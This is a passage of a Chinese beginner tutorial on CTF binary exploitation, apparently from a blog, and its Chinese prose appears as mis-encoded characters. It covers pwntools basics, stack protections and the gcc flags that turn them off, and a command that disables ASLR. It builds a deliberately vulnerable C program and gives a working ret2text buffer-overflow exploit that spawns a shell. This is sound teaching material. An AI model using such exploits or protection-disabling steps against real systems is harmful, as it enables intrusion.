world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># infoä»£è¡¨logç­‰çº§ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># è¦æ³¨æ„å¦‚æœpä½¿ç”¨äº†successä¹‹åï¼Œå°±ä¸èƒ½å†ç”¨pè¾“å‡ºäº†ï¼Œå½“ç„¶ä¸è‡³äºæŠ¥é”™</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># ä¸è¿‡ç›´æ¥ç”¨successæ˜¯å¯ä»¥çš„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure><h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>ä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼ˆä¸€ä¸ªstrï¼‰ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å®šä½å…¶åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®</p><p>åšæ ˆæº¢å‡ºé¢˜ç›®æ—¶ï¼Œpatternå¯ä»¥å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)<span class="comment"># ç”Ÿæˆé•¿åº¦0x100çš„pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)<span class="comment"># æŸ¥æ‰¾è¯¥æ•°æ®åœ¨patternçš„ä½ç½®</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># å¯ä»¥ç”¨å­—ç¬¦ä¸²æŸ¥æ‰¾</span></span><br><span class="line"><span class="comment"># æˆ–è€… cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># æ³¨: åœ¨pwndbgä¸­ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æº¢å‡ºæ—¶æ„é€  <code>cyclic(0x100)</code> ï¼Œæˆ–è€…æ›´é•¿ï¼Œè¾“å…¥å PCçš„å€¼å˜å‘³äº† <code>0x61616161</code> é€šè¿‡ <code>cyclic_find(0x61616161) </code> å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨</p><h4 id="ELFæ–‡ä»¶æ“ä½œ"><a href="#ELFæ–‡ä»¶æ“ä½œ" class="headerlink" title="ELFæ–‡ä»¶æ“ä½œ"></a>ELFæ–‡ä»¶æ“ä½œ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ipythonæˆ–è€…log_level &#x3D; â€˜debugâ€™ çš„è¯å°±ç›¸å½“äºæ˜¯checksecäº†ï¼Œ</p><p>æˆ‘ä»¬åŠ è½½elfæ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†è·å–ä¸€äº›ç¬¦å·ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶"><a href="#ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶" class="headerlink" title="ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶"></a>ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>canaryæ˜¯é‡‘ä¸é›€çš„æ„æ€ã€‚æŠ€æœ¯ä¸Šè¡¨ç¤ºæœ€å…ˆæµ‹è¯•çš„ï¼ˆè¦æ˜¯åœ¨è½¯ä»¶æˆ–è€…å…¶ä»–ä»€ä¹ˆä¸œè¥¿çœ‹åˆ°canaryç‰ˆï¼Œå¤§æ¦‚ç‡å°±æ˜¯æŒ‡æµ‹è¯•ç‰ˆäº†ï¼‰ã€‚è¿™ç§å«æ³•æ¥è‡ªä»¥å‰æŒ–ç…¤æ—¶ï¼ŒçŸ¿å·¥ä»¬ä¼šå…ˆæŠŠé‡‘ä¸é›€æ”¾è¿›çŸ¿æ´ï¼Œæˆ–è€…æŒ–ç…¤çš„æ—¶å€™ä¸€ç›´å¸¦ç€é‡‘ä¸é›€ã€‚é‡‘ä¸é›€å¯¹ç”²çƒ·å’Œä¸€æ°§åŒ–ç¢³æµ“åº¦æ¯”è¾ƒæ•æ„Ÿï¼Œä¼šæœ‰é¢„è­¦ã€‚æ‰€ä»¥å¤§å®¶å°±ä¼šç”¨canaryæ¥ææœ€å…ˆçš„æµ‹è¯•ã€‚åœ¨æ ˆä¸­ï¼Œ<strong>canaryè¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤ã€‚</strong></p><p>canaryçš„å…·ä½“è¡¨ç°æ˜¯åœ¨å‡½æ•°çš„æ ˆåº•æŒ‡é’ˆbpå‰æ·»åŠ ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼ˆåˆå«cookieï¼‰ï¼Œæœ«ä½æ˜¯\x00ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œè¦†ç›–åˆ°canaryå¤„ï¼Œå¹¶ä¸”å¯¼è‡´æ”¹å˜è¯¥å¤„æ•°æ®åï¼Œ<strong>å½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„ï¼ˆä¹Ÿå°±æ˜¯å½“å‰å‡½æ•°è¦ç»“æŸï¼Œå‡†å¤‡è·³è½¬äº†ï¼‰ï¼Œä¼šæ£€æŸ¥canaryå€¼æ˜¯å¦è·Ÿå¼€å§‹å€¼ä¸€æ ·ï¼Œä¸ä¸€æ ·ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼ˆåº”è¯¥ä¼šçœ‹åˆ°ä¸€ä¸²å«æœ‰smashingçš„è‹±æ–‡ï¼‰</strong>ï¼Œä»è€Œè¾¾åˆ°é˜²æ­¢ç¨‹åºæ‰§è¡Œæµè¢«æ¶æ„æ§åˆ¶çš„ç›®çš„ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># canaryç¤ºæ„å›¾</span></span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">+-------------+ &lt;- </span><br><span class="line">|             | buffer</span><br><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|  canary     |</span><br><span class="line">+-------------+</span><br><span class="line">|    bp       |</span><br><span class="line">+-------------+</span><br><span class="line">|  ret addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br></pre></td></tr></table></figure><p><strong>gccä½¿ç”¨ï¼š</strong></p><p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code> </p><p><strong>ï¼ˆå…³é—­ &#x2F; éƒ¨åˆ†å¼€å¯ &#x2F; å…¨éƒ¨å¼€å¯ï¼‰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o filename filename.c// é»˜è®¤ä¸å¼€å¯canary</span><br><span class="line">gcc -o filename -fno-stack-protector filename.c// ç¦ç”¨canary</span><br><span class="line">gcc -o filename -fstack-protector filename.c// å¯ç”¨canaryï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰charæ•°ç»„çš„å‡½æ•°æ’å…¥canaryä¿æŠ¤</span><br><span class="line">gcc -o filename -fstack-protector-all filename.c// å¯ç”¨canaryï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br></pre></td></tr></table></figure><h3 id="NXï¼ˆDEPï¼‰"><a href="#NXï¼ˆDEPï¼‰" class="headerlink" title="NXï¼ˆDEPï¼‰"></a>NXï¼ˆDEPï¼‰</h3><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNXï¼ˆDEPï¼‰çš„è¡¨ç°ä¸ºæŠŠæ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºåˆ°shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p><strong>gccä½¿ç”¨ï¼š</strong></p><p><code>-z execstack / -z noexecstack</code> </p><p><strong>ï¼ˆå…³é—­ &#x2F; å¼€å¯ï¼‰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// é»˜è®¤å¼€å¯NX</span><br><span class="line">gcc -o file -z execstack file.c// ç¦ç”¨NX</span><br><span class="line">gcc -o file -z noexecstack file.c// å¼€å¯NX</span><br></pre></td></tr></table></figure><h3 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆPIE &#x2F; ASLRï¼‰ï¼ˆaddress space layout randomizationï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶æœ‰ä¸‰ç§æƒ…å†µï¼š</p><ul><li>0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–</li><li>1 - è¡¨ç¤ºå°†mmapçš„åŸºåœ°å€ï¼Œæ ˆåŸºåœ°å€å’Œ.soåœ°å€éšæœºåŒ–</li><li>2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ heapçš„åœ°å€éšæœºåŒ–</li></ul><p><strong>è¯¥ä¿æŠ¤ä½¿æ¯æ¬¡è¿è¡Œçš„ç¨‹åºåœ°å€éƒ½ä¸åŒï¼Œé˜²æ­¢æ ¹æ®å›ºå®šåœ°å€æ¥å†™expæ‰§è¡Œæ”»å‡»ã€‚</strong>è¿™å¯ä»¥é˜²æ­¢ret2libcæ–¹å¼é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œå¯ä»¥æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚</p><p><strong>linuxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><strong>gccç”¨æ³•ï¼š</strong></p><p><code>-no-pie / -pie</code></p><p><strong>ï¼ˆå…³é—­ &#x2F; å¼€å¯ï¼‰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// é»˜è®¤å…³é—­PIE</span><br><span class="line">gcc -o file -fpie -pie file.c// å¼€å¯PIEï¼Œå¼ºåº¦ä¸º1</span><br><span class="line">gcc -o file -fPIE -pie file.c// å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2</span><br><span class="line">gcc -o file -fpic file.c// å¼€å¯PICï¼Œå¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE</span><br><span class="line">gcc -o file -fPIC file.c// å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE</span><br></pre></td></tr></table></figure><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELROï¼ˆRelocation Read-Onlyï¼‰å¯ä»¥ä½¿ç¨‹åºæŸäº›éƒ¨åˆ†æ ‡è¯†ä¸ºåªè¯»ã€‚åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š</p><ul><li><strong>Partial RELROï¼š</strong>æ˜¯gccçš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨éƒ¨åˆ†RELROã€‚è¿™æ ·ä»…èƒ½é˜²æ­¢å…¨å±€å˜é‡çš„ç¼“å†²åŒºæº¢å‡ºå¯¼è‡´è¦†ç›–GOT</li><li><strong>Full RELROï¼š</strong>ä½¿æ•´ä¸ªGOTåªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨å‰éœ€è¦è§£ææ‰€æœ‰ç¬¦å·</li></ul><p><em>linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸé‡Œï¼Œæœ‰wï¼ˆwriteï¼‰æƒé™çš„å‚¨å­˜åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å‚¨å­˜å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸã€‚æ‰€ä»¥åœ¨å®‰å…¨è§’åº¦åº”è¯¥å°½é‡å‡å°‘å¯å†™çš„åŒºåŸŸ</em></p><p><em>RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚</em></p><p><strong>å¯ä»¥ç®€å•ç†è§£ä¸ºï¼š</strong></p><ul><li><strong>Partial RELRO -&gt; .gotä¸å¯å†™ï¼Œgot.pltï¼ˆgotè¡¨ï¼‰å¯å†™</strong></li><li><strong>Full RELRO -&gt; .got å’Œ got.plt ä¸å¯å†™</strong></li></ul><p><strong>gccä½¿ç”¨ï¼š</strong></p><p><code>-z norelro / -z lazy / -z now</code></p><p><strong>ï¼ˆå…³é—­ &#x2F; éƒ¨åˆ†å¼€å¯ &#x2F; å®Œå…¨å¼€å¯ï¼‰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// é»˜è®¤ä¸ºPartial RELRO</span><br><span class="line">gcc -o file -z norelro file.c// å…³é—­ï¼Œå³No RELRO</span><br><span class="line">gcc -o file -z lazy file.c// éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO</span><br><span class="line">gcc -o file -z now file.c// å®Œå…¨å¼€å¯ï¼Œå³Full RELRO</span><br></pre></td></tr></table></figure><h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>fortifyæ˜¯è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ï¼Œé€‚ç”¨äºç¨‹åºé‡‡ç”¨å¤§é‡å­—ç¬¦ä¸²æˆ–å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ˜¯babyROPå§"><a href="#æ˜¯babyROPå§" class="headerlink" title="æ˜¯babyROPå§"></a>æ˜¯babyROPå§</h2><p><strong>ä»€ä¹ˆæ˜¯ROP:</strong></p><p>ç±»ä¼¼äºæ¯”è¾ƒå¸¸å¬åˆ°çš„OOPï¼ˆé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼‰ï¼ŒPOPï¼ˆé¢å‘è¿‡ç¨‹ç¼–ç¨‹ï¼‰ï¼ŒFPï¼ˆå‡½æ•°å¼ç¼–ç¨‹ï¼‰ç­‰ã€‚</p><p>ROPå…¨ç§°æ˜¯Return-Oriented Programingï¼ˆé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œ<strong>ROPå°±æ˜¯å°†æºç¨‹åºä¸­æ•£è½çš„æ±‡ç¼–ç¨‹åºç‰‡æ®µï¼ˆä¹Ÿç§°gadgetï¼‰â€œæ‹¼æ¥â€åœ¨ä¸€èµ·ï¼Œä½¿å…¶èƒ½å¤Ÿä¸ºæ”»å‡»è€…æœåŠ¡</strong>ã€‚ éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œæ­¤å¤„çš„â€œæ‹¼æ¥â€ä¸æ˜¯æŒ‡å°†è¿™äº›æ±‡ç¼–ç¨‹åºç‰‡æ®µèšé›†åœ¨æŸä¸ªè¿ç»­çš„å†…å­˜ç©ºé—´ä¸­ï¼Œè€Œæ˜¯è®©å®ƒä»¬åœ¨é€»è¾‘ä¸Šè¿ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ„æˆä¸€ä¸ªâ€è¿”å›é“¾â€œã€‚ROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p><strong>ä¸ºä»€ä¹ˆè¦ROP:</strong></p><p>ROPä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡NX(DEP)ä¿æŠ¤ã€‚<strong>NX(DEP)åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</strong>NXå¼€å¯åï¼Œç›´æ¥å¾€æ ˆä¸Šæˆ–å †ä¸Šæ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœï¼Œæ‰€ä»¥æœ‰äº†å„ç§ç»•è¿‡æ–¹æ³•ï¼Œropæ˜¯å…¶ä¸­ä¸€ç§ã€‚</p><p><strong>ropæ”»å‡»ä¸€èˆ¬è¦æ»¡è¶³ï¼š</strong></p><p>1ï¼‰ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</p><p>2ï¼‰å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„gadgetä»¥åŠå¯¹åº”çš„gadgetåœ°å€ï¼ˆå¦‚æœgadgetæ¯æ¬¡åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œå°±è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”åœ°å€äº†ï¼‰</p><h3 id="åŸºæœ¬ROP"><a href="#åŸºæœ¬ROP" class="headerlink" title="åŸºæœ¬ROP"></a>åŸºæœ¬ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2textï¼ˆret to textï¼‰å®é™…ä¸Šå°±æ˜¯ä¸€ç§ROPï¼Œåªä¸è¿‡åªè¿”å›ä¸€æ¬¡è€Œå·²ï¼ˆè¿”å›åˆ°textä¸Šï¼‰ï¼Œret2textæœ¬è´¨å°±æ˜¯æ§åˆ¶retè¿”å›åˆ°å·²æœ‰çš„ä»£ç ä¸Šå¦‚ï¼šsystem(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œ execv(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œä»è€Œgetshellã€‚</p><p>å†™äº†ä¸€ä¸ªç®€å•çš„ç¨‹åºä½œä¸ºä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PSï¼šç¼–è¯‘æ—¶è®°å¾—å…³æ‰canaryå’Œåœ°å€éšæœºåŒ–</strong></p><p>å»ºè®®ç›´æ¥åœ¨wslé‡Œç¼–è¯‘å°±å¥½ï¼ˆæ‡’å¾—å¼€è™šæ‹Ÿæœºæ~ï¼‰</p><p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p><p>scanfå¤„æ²¡æœ‰å¯¹è¯»å–æ•°æ®é•¿åº¦åšæ£€æµ‹ï¼Œå­˜åœ¨æº¢å‡º</p><p>ä¸è¿‡ç›´æ¥è¯´å¯èƒ½ä¸å¥½ç†è§£ï¼Œçœ‹ä¸€ä¸‹idaå§</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png" alt="main"></p><p>æ ˆç©ºé—´ï¼š</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png" alt="stack"></p><p>æ˜¾ç„¶è¿™é‡Œè¾“å…¥åˆ°äº†v4(å¯¹åº”åˆ°æ ˆé‡Œé¢çš„var_30)ï¼Œå‘ç°è·Ÿé¢„æƒ³çš„0x20ä¸ä¸€æ ·ï¼Œå·å·åŠ äº†ä¸€äº›ç©ºé—´ï¼Œè€Œä¸”å¤šåˆ›å»ºäº†ä¸€ä¸ªä¸çŸ¥é“å¹²ä»€ä¹ˆçš„intå˜é‡ã€‚ä½¿ç”¨å®é™…è¦å¡«å……çš„é•¿åº¦åº”è¯¥æ˜¯</p><p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p><p>è¿™é‡Œçš„0x2cæ˜¯var_30çš„å¤§å°ï¼ˆå¯ä»¥çœ‹åˆ°å·¦è¾¹ä¸€åˆ—æ•°é‚£é‡Œ0x30å’Œ4ç›¸å·®äº†0x2cï¼ˆä¸æ˜¯26å—·ï¼‰ï¼‰ï¼›</p><p>ç„¶å4ä¸ªå­—èŠ‚é•¿åº¦æ˜¯var_4ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªintå˜é‡çš„ï¼Œè¿™é‡Œæ˜¯ç›´æ¥è¦†ç›–è¿‡å»äº†ï¼›</p><p>ç„¶ååé¢çš„8ä¸ªå­—èŠ‚æ˜¯rbpï¼ˆi386å°±æ˜¯4ä¸ªå­—èŠ‚ï¼ˆebpï¼‰ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°så’Œré‚£é‡Œç›¸å·®äº†8ï¼›</p><p>ç„¶åå†è¦†ç›–æ–°çš„è¿”å›åœ°å€ï¼ˆå¦‚æœæœ‰åé—¨å‡½æ•°å°±è¿”å›åˆ°é‚£é‡Œå°±å¥½äº†ï¼‰</p><p>å†ä¸€çœ¼åé—¨å‡½æ•°</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png" alt="binsh"></p><p>å‘ç°&#x2F;bin&#x2F;shå­—ç¬¦ä¸²åœ¨0x401144ä¼ å‚ï¼Œæ‰€ä»¥å°±è¿”å›åˆ°0x401144ï¼Œäºæ˜¯å†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>å³æ§åˆ¶ç¨‹åºæ‰§è¡Œshellcodeä»£ç 